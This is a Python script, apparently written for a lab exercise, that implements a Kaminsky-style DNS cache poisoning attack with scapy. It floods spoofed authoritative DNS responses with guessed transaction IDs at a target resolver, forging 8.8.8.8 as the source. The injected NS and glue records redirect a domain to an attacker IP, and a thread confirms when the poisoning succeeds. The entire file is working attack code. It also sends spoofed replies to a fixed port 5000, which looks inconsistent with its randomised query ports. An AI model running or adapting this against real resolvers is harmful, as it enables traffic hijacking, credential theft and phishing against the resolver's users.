#!/usr/bin/env python3
"""
DNS Cache Poisoning Attack (Kaminsky Style)
Implements the Kaminsky technique for DNS cache poisoning
"""

import argparse
import random
import string
import time
import threading
from scapy.all import *
import sys
import os


class KaminskyAttack:
    def __init__(self, target_ip, domain, num_requests, num_responses, num_tries, delay=0):
        self.target_ip = target_ip
        self.domain = domain
        self.num_requests = num_requests
        self.num_responses = num_responses
        self.num_tries = num_tries
        self.delay = delay
        self.attempt_count = 0
        self.lock = threading.Lock()
        self.cache_confirmed = False
        self.confirmation_received = threading.Event()
        self.attack_successful = False
        self.total_tries = 0
        self.total_requests = 0
        self.total_responses = 0

        # DNS server port
        self.dns_port = 53
        
        # Malicious IP to inject
        self.malicious_ip = "10.0.2.15"  # Attacker's IP
        
        print(f"[+] Initializing Kaminsky attack against {target_ip}")
        print(f"[+] Target domain: {domain}")
        print(f"[+] Malicious IP: {self.malicious_ip}")
        print(f"[+] Requests: {num_requests}, Responses: {num_responses}, Tries: {num_tries}")
    
    def generate_random_subdomain(self):
        """Generate a random subdomain for the attack"""
        length = random.randint(8, 15)
        subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        return f"{subdomain}.{self.domain}"
    
    def create_dns_query(self, subdomain):
        """Create a DNS query packet"""
        # Generate random transaction ID
        query_id = random.randint(0, 65535)
        
        # Create DNS query with explicit transaction ID
        dns_query = DNS(id=query_id, rd=1, qd=DNSQR(qname=subdomain, qtype="A"))
        
        # Create UDP packet
        query_packet = IP(dst=self.target_ip) / UDP(sport=RandShort(), dport=self.dns_port) / dns_query
        
        return query_packet
    
    def create_spoofed_response(self, subdomain, query_id):
        """Create a spoofed DNS response packet"""
        # Create DNS response
        dns_response = DNS(
            id=query_id,
            qr=1,  # Response
            aa=1,  # Authoritative answer
            rd=1,  # Recursion desired
            ra=1,  # Recursion available
            qd=DNSQR(qname=subdomain, qtype="A"),
            an=DNSRR(
                rrname=subdomain,
                type="A",
                rclass="IN",
                ttl=86400,
                rdata=self.malicious_ip
            ),
            ns=DNSRR(
                rrname=self.domain,
                type="NS",
                rclass="IN",
                ttl=86400,
                rdata=f"ns1.{self.domain}"
            ),
            ar=DNSRR(
                rrname=f"ns1.{self.domain}",
                type="A",
                rclass="IN",
                ttl=86400,
                rdata=self.malicious_ip
            )
        )
        
        # Create spoofed UDP packet - send to fixed port 5000
        response_packet = (
            IP(src="8.8.8.8", dst=self.target_ip) /  # Spoof authoritative server
            UDP(sport=53, dport=5000) /  # Fixed destination port 5000
            dns_response
        )
        
        return response_packet
    
    def send_query_and_responses(self, subdomain):
        """Send a query and multiple spoofed responses"""
        try:
            # Create and send query
            query_packet = self.create_dns_query(subdomain)
            query_id = query_packet[DNS].id
            
            print(f"[*] Sending query for {subdomain} with ID: {query_id}")
            
            # Send query
            print(f"[*] Sending query packet to {self.target_ip}:{self.dns_port}")
            send(query_packet, verbose=False)
            self.total_requests += 1
            print(f"[*] Query sent successfully")
            
            # Test connectivity to DNS server first
            try:
                ping_packet = IP(dst=self.target_ip) / ICMP()
                response = sr1(ping_packet, timeout=1, verbose=False)
                if not response:
                    print(f"[-] Warning: DNS server {self.target_ip} may be unreachable")
            except:
                pass
            
            # Generate unique transaction IDs for spoofed responses
            unique_ids = random.sample(range(0, 65536), min(self.num_responses, 65536))
            
            # Send multiple spoofed responses with unique transaction IDs
            print(f"[*] Flooding {len(unique_ids)} responses for {subdomain}")
            
            for i, spoofed_id in enumerate(unique_ids):
                # Check if attack should stop due to successful poisoning
                if self.confirmation_received.is_set():
                    print(f"[*] Stopping response flooding - cache poisoning detected!")
                    break
                    
                response_packet = self.create_spoofed_response(subdomain, spoofed_id)
                send(response_packet, verbose=False)
                self.total_responses += 1
                
                # Progress indicator for large floods
                if i % 10000 == 0 and i > 0:
                    print(f"[*] Sent {i}/{len(unique_ids)} responses...")
                
                if self.delay > 0:
                    time.sleep(self.delay / 1000.0)
            
            with self.lock:
                self.attempt_count += 1
                
        except Exception as e:
            print(f"[-] Error in send_query_and_responses: {e}")
    
    def continuous_verification_worker(self):
        """Continuously verify if DNS cache has been poisoned"""
        print(f"[+] Starting continuous verification thread...")
        verification_attempts = 0
        
        # Create a single verification query packet that we'll reuse
        verification_query = IP(dst=self.target_ip) / UDP(sport=RandShort(), dport=53) / DNS(
            rd=1, qd=DNSQR(qname=self.domain, qtype="A")
        )
        print(f"[+] Created verification query for {self.domain}")
        
        while not self.confirmation_received.is_set():
            try:
                # Send verification query and check response
                response = sr1(verification_query, timeout=3, verbose=False)
                verification_attempts += 1
                
                if response and response.haslayer(DNS):
                    dns_layer = response[DNS]
                    if dns_layer.an:
                        for answer in dns_layer.an:
                            if answer.type == 1:  # A record
                                resolved_ip = answer.rdata
                                
                                if resolved_ip == self.malicious_ip:
                                    print(f"\n[+] SUCCESS: DNS cache poisoning detected after {verification_attempts} verification attempts!")
                                    print(f"[+] {self.domain} now resolves to {resolved_ip}")
                                    self.cache_confirmed = True
                                    self.confirmation_received.set()
                                    self.attack_successful = True
                                    return

                if verification_attempts % 100 == 0:  # Print progress every 100 verifications
                    print(f"[*] Verification attempts: {verification_attempts}")

                # Wait before next verification
                time.sleep(2)  # Check every 2 seconds
                
            except Exception as e:
                print(f"[-] Error in continuous verification: {e}")
                time.sleep(2)
        
        print(f"[+] Continuous verification thread stopped")

    def attack_worker(self):
        """Worker thread for sending attacks"""
        while self.total_requests < self.num_requests and not self.confirmation_received.is_set():
            subdomain = self.generate_random_subdomain()
            self.send_query_and_responses(subdomain)

            # Check if we should continue
            if self.confirmation_received.is_set():
                print(f"[+] Worker stopping due to confirmation received")
                break

            if self.total_requests % 100 == 0:
                print(f"[*] Worker sent {self.total_requests} requests...")

    def run_attack(self):
        """Run the main attack"""
        print(f"[+] Starting Kaminsky attack...")
        start_time = time.time()
        
        # Start continuous verification thread
        verification_thread = threading.Thread(target=self.continuous_verification_worker)
        verification_thread.daemon = True
        verification_thread.start()
        print(f"[+] Started continuous verification thread")
        
        # Run multiple attack rounds
        for round_num in range(self.num_tries):
            print(f"[*] Starting attack round {round_num + 1}/{self.num_tries}")
            
            # Check if attack was already successful
            if self.attack_successful:
                print(f"[+] Attack successful, stopping all rounds")
                break
            
            # Reset attempt count for this round
            self.attempt_count = 0
            
            # For single request, send it directly without threads
            if self.num_requests == 1:
                subdomain = self.generate_random_subdomain()
                self.send_query_and_responses(subdomain)
                self.attempt_count += 1
                print(f"[*] Sent single request for {subdomain}")
            else:
                # Create multiple threads for parallel attacks
                threads = []
                num_threads = min(10, self.num_requests)  # Max 10 threads
                
                for _ in range(num_threads):
                    thread = threading.Thread(target=self.attack_worker)
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)
                
                # Wait for all threads to complete or confirmation received
                for thread in threads:
                    thread.join()  # Wait indefinitely for threads to complete
            
            self.total_tries += 1
            # Check if attack was successful
            if self.attack_successful:
                print(f"[+] Attack successful, stopping all rounds")
                break
            
            print(f"[*] Completed round {round_num + 1}: {self.attempt_count} requests sent")
            # Wait between rounds
            if round_num < self.num_tries - 1:
                print(f"[*] Waiting 5 seconds before next round...")
                time.sleep(5)
        
        # Wait for verification thread to finish
        if verification_thread.is_alive():
            self.confirmation_received.set()  # Signal verification thread to stop
            verification_thread.join(timeout=5)
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n[+] Attack completed!")
        print(f"[+] Total tries: {self.total_tries}")
        print(f"[+] Total requests sent: {self.total_requests}")
        print(f"[+] Total responses sent: {self.total_responses}")
        print(f"[+] Duration: {duration:.2f} seconds")
        print(f"[+] Rate: {(self.total_requests) / duration:.2f} requests/second")
        
        if self.attack_successful:
            print(f"[+] ATTACK RESULT: SUCCESS - DNS cache was poisoned!")
        else:
            print(f"[-] ATTACK RESULT: FAILED - DNS cache was not poisoned")

    def verify_poisoning(self, test_domain, verbose=False):
        """Verify if the DNS cache was poisoned"""
        if verbose:
            print(f"\n[+] Verifying DNS cache poisoning...")
        
        try:
            # Create a test query
            test_query = IP(dst=self.target_ip) / UDP(sport=RandShort(), dport=53) / DNS(
                rd=1, qd=DNSQR(qname=test_domain, qtype="A")
            )
            if verbose:
                print(f"[*] Verification query packet: {test_query.summary()}")
                print(f"[*] Sending verification query for {test_domain} to {self.target_ip}")
            # Send query and wait for response
            response = sr1(test_query, timeout=5, verbose=False)
            
            if response and response.haslayer(DNS):
                dns_layer = response[DNS]
                if verbose:
                    print(f"[+] Received DNS response: {dns_layer.summary()}")
                if dns_layer.an:
                    for answer in dns_layer.an:
                        if answer.type == 1:  # A record
                            resolved_ip = answer.rdata
                            if verbose:
                                print(f"[+] DNS resolution: {test_domain} -> {resolved_ip}")
                            
                            if resolved_ip == self.malicious_ip:
                                print(f"[+] SUCCESS: DNS cache poisoned! {test_domain} resolves to {resolved_ip}")
                                return True
                            else:
                                if verbose:
                                    print(f"[+] DNS cache not poisoned. {test_domain} resolves to {resolved_ip}")
                                return False
                else:
                    if verbose:
                        print(f"[-] No answer section in DNS response")
            else:
                if verbose:
                    print(f"[-] No response received or no DNS layer")
            
            if verbose:
                print(f"[-] No DNS response received")
            return False
            
        except Exception as e:
            if verbose:
                print(f"[-] Error verifying poisoning: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description="DNS Cache Poisoning Attack (Kaminsky Style)")
    parser.add_argument("--target", default="192.168.100.10", help="Target DNS server IP")
    parser.add_argument("--domain", default="friendsbook.com", help="Target domain for poisoning")
    parser.add_argument("--requests", type=int, default=1000, help="Number of DNS requests to send")
    parser.add_argument("--responses", type=int, default=1000, help="Number of spoofed responses per request")
    parser.add_argument("--tries", type=int, default=10, help="Number of attack rounds")
    parser.add_argument("--delay", type=int, default=0, help="Delay between requests (ms)")
    parser.add_argument("--verify", action="store_true", help="Verify poisoning after attack")
    parser.add_argument("--test-domain", help="Domain to test for poisoning verification")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()
    
    # Check if running as root (required for raw sockets)
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo)")
        sys.exit(1)
    
    # Create attack instance
    attack = KaminskyAttack(
        target_ip=args.target,
        domain=args.domain,
        num_requests=args.requests,
        num_responses=args.responses,
        num_tries=args.tries,
        delay=args.delay
    )
    
    # Run attack
    attack.run_attack()
    
    # Verify poisoning if requested
    if args.verify:
        test_domain = args.test_domain or f"www.{args.domain}"
        attack.verify_poisoning(test_domain, verbose=True)

if __name__ == "__main__":
    main() 